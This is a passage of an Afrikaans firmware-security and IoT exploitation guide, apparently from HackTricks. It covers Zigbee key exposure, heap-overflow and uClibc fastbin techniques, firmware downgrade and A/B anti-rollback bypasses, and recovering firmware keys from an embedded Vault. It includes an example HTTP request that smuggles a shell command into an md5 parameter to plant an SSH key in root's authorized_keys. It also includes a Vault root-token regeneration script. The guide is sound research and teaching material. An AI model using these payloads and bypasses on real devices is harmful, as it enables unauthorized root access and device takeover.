Inspekteer volgehoue toestand buite die guest wanneer stadige selflaaie, vernietigende opstartskripte of onbetroubare konsole-aanmelding die fout verdoesel. Moet nooit ’n overlay koppel wat ’n lopende VM gebruik nie; stel dit met `qemu-nbd` bloot, beperk LVM-ontdekking tot die bedoelde NBD-partisie en deaktiveer die volumegroep voordat jy die verbinding verbreek.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Vir herhaalbare foutisolasie, skryf lêers met tydstempels as merkers na ’n stabiele skryfbare volume en verifieer hulle vanlyn; `/dev/kmsg`, FIFOs en tydelike konsoles kan vals negatiewe resultate oplewer weens koersbeperking of vroeë prosesbeëindiging. Vergelyk ook presiese koppelvlakke oor lae heen voordat jy onverwante kode verander: `uname -r` teenoor `/lib/modules/`, ext4-funksies op skyf teenoor kernkonfigurasie, en die Mesa `libGL`-generasie teenoor DRI-driver-ABI en PCI-afgeleide drivername. ’n Komponent kan bestaan en selfs suksesvol `dlopen()` word, maar steeds onbruikbaar wees omdat die verbruiker ’n ander ABI verwag.<sup>[[11]](#references)</sup>

## Dinamiese analise in die praktyk

Op hierdie stadium word ’n werklike of geëmuleerde toest omgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die bedryfstelsel en lêerstelsel te behou. Emulasie boots dalk nie hardeware-interaksies perfek na nie, wat dit soms nodig maak om die emulasie te herbegin. Die analise moet die lêerstelsel weer ondersoek, blootgestelde webblaaie en netwerkdienste uitbuit, en kwesbaarhede in die selflaaiprogram verken. Firmware-integriteitstoetse is noodsaaklik om moontlike backdoor-kwesbaarhede te identifiseer.

## Looptydanalisetegnieke

Looptydanalise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing, met nutsmiddels soos gdb-multiarch, Frida en Ghidra om breekpunte te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige debugger, **kopieer ’n staties-gelinkte `gdbserver`** na die toestel en koppel op afstand daaraan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor-boodskapkartering

Op IoT-hubs word die RF-stapel dikwels tussen ’n **radio-MCU** en ’n Linux-gebruikerslandproses verdeel. ’n Nuttige werkvloei is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF-raam** oor die lug
2. **Beheerderkant-ontleder** op die radio-MCU
3. **Seriële/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **Toepassingsversender** in die hoofdemon
5. **Protokolspesifieke hanteerder / toestandsmasjien**

Hierdie argitektuur skep twee omgekeerde-ingenieursteikens in plaas van een. As die beheerder binêre radiograme in ’n teksprotokol soos `Group,Command,arg1,arg2,...` omskakel, bepaal:

- Die **boodskapgroepe** en versendingstabelle
- Watter boodskappe van die **netwerk** kan kom teenoor dié wat van die beheerder self kom
- Die presiese **vervaardigerspesifieke diskrimineerdervelde** (byvoorbeeld Zigbee se `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter hanteerders slegs tydens **commissioning**, ontdekking of firmware-/modelaflaaifases bereik kan word

Vang spesifiek vir Zigbee paringverkeer op en kyk of die teiken steeds die verstek-**Link Key** `ZigBeeAlliance09` gebruik. Indien wel, kan die **Network Key** deur die opvang van commissioning-verkeer blootgelê word. Zigbee 3.0-installasiekodes verminder hierdie blootstelling, dus let op of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protokోలhanteerders en FSM-beheerde bereikbaarheid

Vervaardigerspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters, omdat hulle **pasgemaakte ontledingskode** en interne **FSM’e** voed waarvan die validering minder deeglik getoets is.<sup>[[8]](#references)</sup>

Praktiese werkvloei:

- Keer die opdragversender om totdat jy die **slegs-vervaardiger-hanteerder** vind.
- Herwin die **FSM-toestand**-, **gebeurtenis**-, **kontrole**-, **aksie**- en **volgende-toestand**-tabelle.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, en herprobeer-/foutvertakkings wat uiteindelik aanvallerbeheerde toestand terugstel of vrystel.
- Bevestig watter wettige protokoluitruilings nodig is om die daemoon in die kwesbare toestand te plaas, eerder as om aan te neem dat die foutiewe hanteerder altyd bereikbaar is.

Vir tydsensitiewe protokolle kan pakketherhaling vanuit ’n Python-raamwerk te stadig wees. ’n Betroubaarder benadering is om ’n wettige toestel op regte hardeware (byvoorbeeld ’n **nRF52840**) met ’n vervaardigervlakstapel na te boots, sodat jy die korrekte **eindpunte**, **eienskappe** en commissioning-tydsberekening kan blootlê.

### Foutklas vir gefragmenteerde aflaaie in ingebedde daemone

’n Herhalende firmwarefoutklas kom voor in **gefragmenteerde blob-/model-/konfigurasie-aflaaie**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakketplaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **oorspronklike toegekende grootte** te kontroleer.

Dit laat ’n aanvaller toe om:

- ’n Eerste geldige fragment met ’n **klein** verklaarde totale grootte te stuur om ’n klein heap-toekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`, te stuur.
- ’n vervalste pakketplaaslike grootte te verskaf wat die nuwe kontroles slaag, terwyl die oorspronklik toegekende buffer steeds oorloop.

Wanneer die kwesbare pad agter commissioning-logika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken na die verwagte modelaflaai- of blobaflaaitoestand te stuur voordat die misvormde fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde daemone is die maklikste manier om heap-metadata-uitbuiting te veroorsaak dikwels nie om “vir opruiming te wag” nie, maar om **die protokol se eie fouthantering af te dwing**:<sup>[[8]](#references)</sup>

- Stuur misvormde opvolgfragmente om die FSM na **herprobeer-** of **fouttoestande** te stuur.
- Oorskry die herprobeerdrempel sodat die daemoon die **konteks terugstel** en die korrupte buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om primitiewe aan die toewyserkant te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** toewysers in ingebedde Linux, waar korrupsie van blokmetadata unlink-/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te korrupteer om die toewyser se deurkruising na **vals blokke wat binne die oorvoltooide buffer geplaas is** te herlei, eerder as om werklike bin-wysers onmiddellik te beskadig en die proses te laat ineenstort.

## Binary Exploitation and Proof-of-Concept

Die ontwikkeling van ’n PoC vir geïdentifiseerde kwesbaarhede vereis ’n diep begrip van die teikenargitektuur en programmering in laervlaktale. Binêre looptydbeskerming is skaars in ingebedde stelsels, maar wanneer dit voorkom, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc-fastbin-uitbuitingsnotas (ingebedde Linux)

- **Fastbins + konsolidasie:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vals blok kontroles slaag (aanvaarbare grootte, `fd = 0`, en omliggende blokke wat as “in gebruik” beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binêre lêers onder ASLR:** as ASLR geaktiveer is, maar die hoofbinêre lêer **nie-PIE** is, is adresse in die binêre lêer se `.data/.bss` stabiel. Jy kan ’n streek teiken wat reeds soos ’n geldige heap-blokkop lyk om ’n fastbin-toekenning op ’n **funksiewyssertabel** te laat beland.
- **NUL wat die ontleder stop:** wanneer JSON ontleed word, kan ’n `\x00` in die loonvrag die ontleding stop terwyl agteraanliggende aanvallerbeheerde grepe behoue bly vir ’n stapelspil-/ROP-ketting.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende kartering plaas en daarnaar spring.

## Voorbereide bedryfstelsels vir firmware-ontleding

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf gekonfigureerde omgewings vir firmwaresekuriteitstoetsing, toegerus met die nodige gereedskap.

## Voorbereide bedryfstelsels vir firmware-ontleding

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n verspreiding wat bedoel is om jou te help met sekuriteitsassessering en penetrasietoetsing van Internet of Things (IoT)-toestelle. Dit bespaar jou baie tyd deur ’n vooraf gekonfigureerde omgewing met al die nodige gereedskap te verskaf.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met firmwaresekuriteitstoetsingsgereedskap.

## Firmware-afgraderingsaanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n vervaardiger kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **beskerming teen weergawe-terugrol (afgradering)** dikwels weggelaat. Wanneer die selflaai- of herstel-laaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotone teller) van die beeld wat geflits word vergelyk nie, kan ’n aanvaller wettiglik ’n **ouer, kwesbare firmware met ’n geldige handtekening** installeer en sodoende reggestelde kwesbaarhede weer invoer.<sup>[[4]](#references)</sup>

Tipiese aanvalswerkvloei:

1. **Kry ’n ouer beeld met ’n geldige handtekening**
   * Kry dit vanaf die vervaardiger se openbare aflaaiportaal, CDN of ondersteuningswebwerf.
   * Onttrek dit uit gepaardgaande mobiele-/rekenaartoepassings (bv. binne ’n Android APK onder `assets/firmware/`).
   * Kry dit uit derdeparty-bewaarplekke soos VirusTotal, internetargiewe, forums, ens.
2. **Laai die beeld na die toestel op of bedien dit aan die toestel** via enige blootgestelde opdateringskanaal:
   * Web-UI, mobiele toepassing se API, USB, TFTP, MQTT, ens.
   * Baie IoT-toestelle vir verbruikers stel *ongeverifieerde* HTTP(S)-eindpunte bloot wat Base64-geënkodeerde firmwareblobs aanvaar, dit aan die bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Ná die afgradering, buit ’n kwesbaarheid uit wat in die nuwer weergawe reggestel is (byvoorbeeld ’n opdraginspuitingsfilter wat later bygevoeg is).
4. Flits opsioneel die nuutste beeld terug of deaktiveer opdaterings om opsporing te vermy sodra volharding verkry is.

### Voorbeeld: Opdraginspuiting ná afgradering

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk sonder sanitisering by ’n shell-opdrag gevoeg, wat inspuiting van arbitrêre opdragte moontlik maak (hier – om SSH-sleutelgebaseerde worteltoegang moontlik te maak). Latere firmwareweergawes het ’n basiese karakterfilter ingestel, maar omdat daar geen beskerming teen teruggradering is nie, is die oplossing nutteloos.<sup>[[4]](#references)</sup>

### Onttrekking van Firmware uit Mobiele Toepassings

Baie verskaffers sluit volledige firmwarebeelde by hul metgesel-mobiele toepassings in sodat die toepassing die toestel via Bluetooth/Wi-Fi kan bywerk. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor, onder paaie soos `assets/fw/` of `res/raw/`. Gereedskap soos `apktool`, `ghidra` of selfs gewone `unzip` laat jou toe om ondertekende beelde te onttrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Anti-rollback-omseiling slegs via updater in A/B-slotontwerpe

Sommige verskaffers implementeer wel ’n anti-downgrade-**ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n herstelopdrag of ’n userspace-OTA-agent). As die **bootloader** later slegs die beeld se handtekening/CRC nagaan en die partisietabel of slotmetadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmwaremetadata bevat beide ’n weergawebeskrywing en ’n **security ratchet** / monotone teller.
- Die updater vergelyk die beeld se ratchet met ’n waarde wat in aanhoudende berging gestoor is en verwerp ouer ondertekende beelde.
- Die bootloader **ontleed nie** daardie ratchet nie en verifieer slegs die kopstuk, CRC en handtekening voordat dit die gekose slot selflaai.
- Slotaktivering word afsonderlik in ’n partisietabel of per-slot-generasieteller gestoor en is **nie kriptografies gekoppel** aan die presiese firmware-digest wat gevalideer is nie.

Dit skep ’n **valideer-een-beeld / selflaai-’n-ander-beeld**-primitief in dubbel-slotsisteme. As die aanvaller die updater kan laat merk dat slot B die volgende selflaaiteiken is deur ’n huidige ondertekende beeld te gebruik, en slot B later voor herbegin kan oorskryf, kan die bootloader steeds die afgegradeerde beeld selflaai omdat dit slegs die reeds vasgelegde slotmetadata vertrou.

Algemene misbruikpatroon:

1. Laai ’n **huidige ondertekende** firmware na die passiewe slot op en voer die normale validerings-/wisselroetine uit sodat die uitleg daardie slot as die volgende aktiewe slot merk.
2. **Moenie nog herbegin nie**. Voer die gleufvoorbereidings-/uitroetine weer in dieselfde sessie uit.
3. Misbruik verouderde selflaaitoestand- of slotkeurlogika sodat die updater die **dieselfde fisiese slot** uitvee wat pas bevorder is.
4. Skryf ’n **ouer maar steeds ondertekende** firmware na daardie slot.
5. Slaan die valideringsroetine wat die ratchet afdwing oor en herbegin direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs die handtekening/integriteit en selflaai die ou beeld.

Dinge waarna jy moet kyk wanneer jy A/B-opdateringsimplementasies reverse-engineer:

- Slotkeuse wat afgelei word van **selflaaitydvlae** wat nie ná ’n suksesvolle wissel verfris word nie.
- ’n `prepare_passive_slot()`-agtige roetine wat ’n slot uitvee op grond van verouderde toestand eerder as die **huidige vasgelegde uitleg**.
- ’n `part_write_layout()`-agtige funksie wat slegs ’n **generasieteller** / aktiewe vlag verhoog en nie die gevalideerde beeld-hash stoor nie.
- Ratchet-kontroles wat in userspace- of updater-kode geïmplementeer is, maar **nie** in ROM-/bootloader-/secure-boot-stadia nie.
- Uitvee- of herstelroetines wat die slot as selflaaibaar gemerk laat, selfs nadat die inhoud daarvan verwyder en herskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die vervoer/verifikasie van die *update endpoint* voldoende beskerm (TLS + verifikasie)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit flits?
* Word die beeld binne ’n secure-boot-ketting geverifieer (bv. handtekeninge wat deur ROM-kode nagegaan word)?
* Dwing die **bootloader dieselfde ratchet as die updater af**, eerder as om slegs die handtekening/CRC na te gaan?
* Is slotaktiveringsmetadata **gekoppel aan die gevalideerde firmware-digest/weergawe**, of kan ’n slot ná bevordering gewysig word?
* Word die toestel ná ’n suksesvolle slotwissel gedwing om te herbegin, of is latere opdaterings-/uitroetines steeds in dieselfde sessie bereikbaar?
* Voer userland-kode bykomende gesondeverstandkontroles uit (bv. toegelate partisiekaart, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloeie dieselfde valideringslogika?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Om te oefen om kwesbaarhede in firmware te ontdek, gebruik die volgende kwesbare firmwareprojekte as ’n beginpunt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS/Vault-toestand

Wanneer ’n opdateringsbeeld klein metadata in gewone teks met ’n groot blob met hoë entropie kombineer, doen houertriage voordat jy enigiets brute-forceer:<sup>[[1]](#references)</sup>

- Stort kopstukke, offsets en reëlgrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` dui gewoonlik op die OpenSSL `enc`-formaat: die volgende 8 grepe is die salt en die oorblywende grepe is syferteks.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk aanduiding dat jy na ’n RSA-2048-syferteks kyk wat ’n ewekansige firmwarewagwoord/sessiesleutel omhul.
- Afsonderlike PGP-materiaal in dieselfde lêer beskerm dikwels slegs egtheid; moenie aanvaar dat dit die vertroulikheidsmeganisme is nie.

As statiese sleutelsoektog (`grep`, `strings`, PEM-/PGP-soektogte) misluk, reverse-engineer eerder die **operasionele dekripteerpad** as om net na private sleutels te soek:

- Decompileer die updater-/bestuursbinêre lêer en volg wie die geënkripteerde blob lees, watter helper/API dit ontsluit en watter logiese sleutelnaam dit aanvra.
- Soek in die onttrekte root-lêerstelsel na KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), asook eenheidlêers en init-skripte.
- Behandel gewone teks soos `vault operator unseal ...`, herstelsleutels, bootstrap-tokens of plaaslike KMS-auto-unseal-skripte as gelykstaande aan private-sleutelmateriaal.

As die toestel die oorspronklike Vault-binêre lêer en bergingsbackend bevat, is dit gewoonlik makliker om daardie omgewing weer te laat loop as om Vault se interne werking te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root op die gekloonde KMS:

- Maak transit-sleutels slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Probeer die herwonne RSA-sleutel met die presiese padding-/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gesteunde vloeie gebruik OAEP met SHA-256, terwyl algemene biblioteke SHA-1 as verstek gebruik.
- As die payload met `Salted__` begin, boots die verskaffer se OpenSSL-KDF presies na (`EVP_BytesToKey`, dikwels MD5 op ouer toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander “geënkripteerde firmware” in ’n meer algemene probleem: **herwin die operasionele sleutels aan die toestel se kant, en boots dan die presiese unwrap- en KDF-parameters vanlyn na**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kraak firmware met Claude: Vaardigheid op senior vlak, outonomie op junior vlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-inbraak: Die definitiewe gids vir aanvalle op die Internet van Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Uitbuiting van zero-days in verlate hardeware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy my: Nou is jy gepwn](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Uitbuiting van die Tesla Wall Connector via sy laaipoortverbinding - Deel 2: omseiling van die anti-downgrade-beskerming](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Lugversending-uitbuiting van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS op QEMU Deel 1: Uitpak](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-kerneldokumentasie - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS op QEMU Deel 2: Ontfouting en regstelling](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS-wagwoorde: Swak XOR-enkripsie maak herstel vanaf SPI-flitsgeheue moontlik (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Gereedskap vir herstel van Dell BIOS-wagwoorde](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Herhaling van hardeware-inbraak, Deel 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
